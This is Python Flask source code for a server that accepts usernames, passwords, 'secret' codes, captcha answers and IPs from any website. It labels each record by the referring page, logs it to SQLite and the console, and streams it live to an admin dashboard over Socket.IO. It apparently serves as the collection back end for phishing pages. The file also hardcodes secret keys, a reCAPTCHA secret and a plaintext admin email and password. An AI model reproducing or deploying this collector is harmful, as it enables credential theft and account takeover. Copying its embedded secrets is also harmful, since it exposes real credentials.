import jwt
import json
import pytz
import sqlite3
import datetime
from sqlite3 import Error
from flask_cors import CORS
from flask_socketio import SocketIO, emit
from flask import Flask, jsonify, request, render_template

#####################################################################
# SETUP #############################################################
#####################################################################

app = Flask(__name__, template_folder='app', static_folder='static')
app.secret_key = 'cjxm4RnxwdeZniuidzl5oPSI9PXmUZqS'

CORS(app)

socketio = SocketIO(app, cors_allowed_origins='*')

USERNAME = None
SECRET_KEY = 'dobahung'
RECAPTCHA_SECRET_KEY = "6Lc08TYnAAAAAPuopLkUWc9TVMsqEWi6QTKX0m8q"
IS_ADMIN_LOGGED_IN = False

CREATE_TABLE_QUERY = """
CREATE TABLE IF NOT EXISTS events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp TEXT NOT NULL,
    project TEXT,
    username TEXT,
    password TEXT,
    secret TEXT,
    ip TEXT,
    event TEXT,
    href TEXT,
    captcha TEXT,
    user_agent TEXT,
    json TEXT
);
"""


class UserEvent:
    def __init__(self, project='', username='', password='', secret='', ip='', user_agent='', event='', href='', captcha='', json=''):
        japan_tz = pytz.timezone('Asia/Tokyo')
        japan_time = datetime.datetime.now(tz=japan_tz)

        self.timestamp = japan_time.isoformat()
        self.project = project
        self.username = username
        self.password = password
        self.secret = secret
        self.ip = ip
        self.user_agent = user_agent
        self.event = event
        self.href = href
        self.captcha = captcha
        self.json = json

    def __str__(self):
        return (
            f"UserEvent(project={self.project}, username={self.username}, "
            f"password={self.password}, secret={self.secret}, ip={self.ip}, "
            f"event={self.event}, captcha={self.captcha}, href={self.href}, "
            f"user_agent={self.user_agent}, json={self.json})"
        )

#####################################################################
# FUNCTION ##########################################################
#####################################################################


def authenticate_token(token):
    try:
        decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return decoded
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None


def create_connection():
    try:
        conn = sqlite3.connect('event.db')
        return conn
    except Error as e:
        print(e)
    return None


def create_table():
    conn = create_connection()
    if conn is not None:
        try:
            c = conn.cursor()
            c.execute(CREATE_TABLE_QUERY)
            conn.commit()
        except Error as e:
            print(e)
        finally:
            conn.close()
    else:
        print("Error: Unable to establish a database connection")


def save_to_database(userEvent: UserEvent):
    create_table()

    conn = create_connection()
    if conn is not None:
        # try:
        c = conn.cursor()
        c.execute(
            "INSERT INTO events (timestamp, project, username, password, secret, ip, event, href, captcha, user_agent, json) VALUES (?,?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (userEvent.timestamp, userEvent.project, userEvent.username, userEvent.password, userEvent.secret, userEvent.ip, userEvent.event, userEvent.href, userEvent.captcha, userEvent.user_agent, userEvent.json))
        conn.commit()
        print(
            f"{userEvent.timestamp}: {userEvent.project}: {userEvent.username}:{userEvent.password}: Data inserted successfully")
        # except Error as e:
        #     print(e)
        # finally:
        conn.close()
    else:
        print("Error: Unable to establish a database connection")
#####################################################################
# ROUTER ############################################################
#####################################################################


@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')


@app.route('/admin')
def admin():
    return render_template('admin.html')


@app.route('/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        email = data['email']
        password = data['password']

        if email == 'hungdoba.hdb@gmail.com' and password == 'dobahung6':
            token = jwt.encode(
                {'email': email}, SECRET_KEY, algorithm='HS256')
            return jsonify({'message': 'Admin login success', 'token': token}), 200
        else:
            return jsonify({'message': 'Invalid credentials'}), 401
    except Exception as e:
        return jsonify({'message': 'An error occurred', 'error': str(e)}), 500


@app.route('/authenticate', methods=['GET', 'POST'])
def authenticate():
    token = request.headers.get('Authorization', '').split(' ')[1]

    if not token:
        return jsonify({'message': 'No token provided'}), 401

    decoded_token = authenticate_token(token)
    if not decoded_token:
        return jsonify({'message': 'Failed to authenticate token'}), 403

    return jsonify({'message': 'Token is valid'}), 200


@app.route('/checkadmin', methods=['GET'])
def check_admin_login_status():
    global IS_ADMIN_LOGGED_IN
    return jsonify({'status': IS_ADMIN_LOGGED_IN}), 200


@app.route('/event', methods=['POST'])
def handle_user_event():
    request_data = request.get_json()
    jsondata = json.dumps(request_data)
    project = request.headers.get('Referer')

    userEvent = UserEvent(
        project=project,
        username=request_data.get('username'),
        password=request_data.get('password'),
        secret=request_data.get('secret'),
        ip=request_data.get('ip'),
        event=request_data.get('event'),
        captcha=request_data.get('captcha'),
        href=request_data.get('href'),
        user_agent=request.user_agent.string,
        json=jsondata
    )

    save_to_database(userEvent)

    emit('emit_event', userEvent.__dict__,
         broadcast=True, namespace='/')

    print(userEvent)

    return jsonify({"message": "Emit event success"}), 200


#####################################################################
# SOCKET ############################################################
#####################################################################
@socketio.on('connect')
def on_connect():
    global IS_ADMIN_LOGGED_IN
    IS_ADMIN_LOGGED_IN = True
    print(f"Admin connected")


@socketio.on('disconnect')
def on_disconnect():
    global IS_ADMIN_LOGGED_IN
    IS_ADMIN_LOGGED_IN = False
    print(f"Admin disconnected")


#####################################################################
# EXECUTE ###########################################################
#####################################################################
if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=8000)
    # socketio.run(app)
